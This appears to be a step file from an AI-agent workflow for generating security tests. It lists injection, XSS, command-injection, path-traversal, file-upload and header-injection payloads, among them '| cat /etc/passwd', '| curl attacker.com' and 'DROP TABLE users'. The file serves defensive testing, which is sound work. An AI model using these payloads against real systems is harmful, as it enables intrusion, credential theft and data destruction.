---
name: 'sec-c-step-04-input-validation-tests'
step: 4
mode: create
next_step: 'step-05-container-dep-scan.md'
previous_step: 'step-03-auth-security-tests.md'
---

# Step 4 — Injection, XSS, CSRF, and Input Validation Tests

## STEP GOAL

Generate security tests that verify the application correctly validates, sanitizes, and rejects malicious input across all input vectors. Cover the major injection categories (SQL, XSS, CSRF, command injection, path traversal) and validate security header configuration.

## MANDATORY EXECUTION RULES

1. You MUST generate injection tests for every input vector identified in the attack surface (step 1).
2. You MUST test all three XSS types: reflected, stored, and DOM-based (where applicable).
3. You MUST verify CSRF protection on all state-changing endpoints.
4. You MUST verify security headers are correctly configured.
5. You MUST include payloads that test encoding bypass techniques, not just basic payloads.
6. You MUST save progress after completing this step.

## CONTEXT BOUNDARIES

- Read progress file for attack surface, endpoints, and input vectors
- Read route definitions for endpoint signatures and input parameters
- Read middleware configuration for validation and sanitization
- Read security header configuration
- Create test files in `{test_dir}/security/input/`
- Do NOT execute tests against live systems
- Do NOT use destructive payloads that could damage test databases

## MANDATORY SEQUENCE

### 4.1 — Generate SQL Injection Tests

For each endpoint that interacts with a database:

1. **Classic SQL injection** — Test with payloads:
   - `' OR '1'='1`
   - `'; DROP TABLE users; --`
   - `' UNION SELECT null, username, password FROM users --`
   - `1; WAITFOR DELAY '0:0:5' --` (time-based blind)

2. **Parameterized query verification** — Verify ORM or prepared statements are used:
   - Test with special characters in normal input fields
   - Verify no SQL errors leak in responses

3. **NoSQL injection** (if MongoDB, CouchDB, etc.):
   - `{"$gt": ""}` in JSON fields
   - `{"$ne": null}` to bypass equality checks
   - `{"$regex": ".*"}` for data extraction

4. **ORM injection** — Test for ORM-specific bypass patterns:
   - Mass assignment: send extra fields not in the schema
   - Query manipulation through nested object parameters

5. **Encoding bypass** — Test URL-encoded, double-encoded, and Unicode variants:
   - `%27%20OR%20%271%27%3D%271`
   - `%252527` (double encoding)

### 4.2 — Generate XSS Tests

For each endpoint that renders user input:

1. **Reflected XSS** — Inject in query parameters and check response:
   - `<script>alert('XSS')</script>`
   - `<img src=x onerror=alert('XSS')>`
   - `<svg/onload=alert('XSS')>`
   - `javascript:alert('XSS')` in URL parameters

2. **Stored XSS** — Inject in fields that persist and display to other users:
   - User profile fields (name, bio, website)
   - Comments and messages
   - File names in upload features

3. **DOM-based XSS** — Test client-side rendering:
   - Fragment identifiers (`#<script>`)
   - `document.location` manipulation
   - `innerHTML` injection vectors

4. **Filter bypass techniques:**
   - Case variation: `<ScRiPt>`
   - HTML encoding: `&#60;script&#62;`
   - Null byte: `<scr%00ipt>`
   - Event handlers without tags: `" onmouseover="alert('XSS')`
   - SVG and MathML context switching

5. **Content Security Policy validation:**
   - Verify CSP header is present and correctly configured
   - Verify `unsafe-inline` and `unsafe-eval` are not used (or are scoped)

### 4.3 — Generate CSRF Tests

For each state-changing endpoint (POST, PUT, DELETE, PATCH):

1. **Missing CSRF token** — Send request without CSRF token, verify rejection
2. **Invalid CSRF token** — Send request with tampered token, verify rejection
3. **Cross-origin request** — Simulate request from different origin, verify rejection
4. **SameSite cookie attribute** — Verify cookies have SameSite=Strict or SameSite=Lax
5. **Token-per-request** — Verify CSRF tokens are not reusable across requests (if applicable)
6. **JSON content-type bypass** — For JSON APIs, verify Content-Type enforcement prevents form-based CSRF

### 4.4 — Generate Command Injection Tests

For endpoints that may interact with OS processes (file operations, PDF generation, image processing, system commands):

1. **Basic command injection:**
   - `; ls -la`
   - `| cat /etc/passwd`
   - `` `whoami` ``
   - `$(id)`

2. **Blind command injection:**
   - `; sleep 5` (time-based detection)
   - `| curl attacker.com` (out-of-band detection)

3. **Path traversal:**
   - `../../../etc/passwd`
   - `....//....//....//etc/passwd` (filter bypass)
   - `%2e%2e%2f%2e%2e%2f` (URL-encoded)
   - Null byte: `../../../etc/passwd%00.jpg`

4. **File upload attacks:**
   - Upload file with `.php`, `.jsp`, `.aspx` extension
   - Upload file with double extension: `image.php.jpg`
   - Upload file with manipulated Content-Type
   - Upload oversized file (DoS vector)
   - Upload file with path traversal in filename: `../../shell.php`

### 4.5 — Generate Header Injection Tests

Test HTTP header-based attacks:

1. **Host header injection:**
   - Send request with manipulated Host header
   - Check for password reset link poisoning
   - Check for cache poisoning

2. **X-Forwarded-For manipulation:**
   - Send spoofed `X-Forwarded-For` to bypass IP restrictions
   - Verify server does not blindly trust client-supplied headers

3. **Response splitting:**
   - Inject CRLF characters in user-controlled header values
   - `%0d%0aSet-Cookie:%20admin=true`

### 4.6 — Generate Security Header Validation Tests

Verify response headers on all endpoints:

1. **Strict-Transport-Security** — HSTS with adequate max-age and includeSubDomains
2. **Content-Security-Policy** — Restrictive CSP without unsafe-inline/unsafe-eval
3. **X-Content-Type-Options** — nosniff
4. **X-Frame-Options** — DENY or SAMEORIGIN (or CSP frame-ancestors)
5. **Referrer-Policy** — strict-origin-when-cross-origin or more restrictive
6. **Permissions-Policy** — Restrict unnecessary browser features
7. **Cache-Control** — no-store on sensitive endpoints
8. **CORS** — Verify Access-Control-Allow-Origin is not wildcard with credentials

## Save Progress

Update `{test_artifacts}/workflow-progress.md`:

```markdown
## Status: Step 4 Complete — Input Validation Tests Generated

## Generated Files
- [list of all generated input validation test files]

## Test Coverage
- SQL injection: [count] test cases across [count] endpoints
- XSS: [count] test cases (reflected, stored, DOM-based)
- CSRF: [count] test cases across [count] state-changing endpoints
- Command injection: [count] test cases
- Path traversal: [count] test cases
- Header injection: [count] test cases
- Security headers: [count] validations

## Threats Addressed
[List of threats from threat model that are now covered]

## Next Step
step-05-container-dep-scan.md
```

## SUCCESS METRICS

- SQL injection tests cover at least 3 payload categories (classic, blind, encoding bypass)
- XSS tests cover reflected, stored, and filter bypass techniques
- CSRF tests verify token enforcement on all state-changing endpoints
- Security header validation covers all 8 critical headers
- Command injection and path traversal tested where applicable
- Each test includes comments explaining the attack vector
- Progress file updated

## FAILURE METRICS

- Only basic injection payloads tested (no encoding bypass)
- XSS tests cover only reflected, missing stored and DOM-based
- CSRF tests missing or incomplete
- Security headers not validated
- Tests lack explanatory comments
- Progress file not updated

---

**Next step:** Load `step-05-container-dep-scan.md`
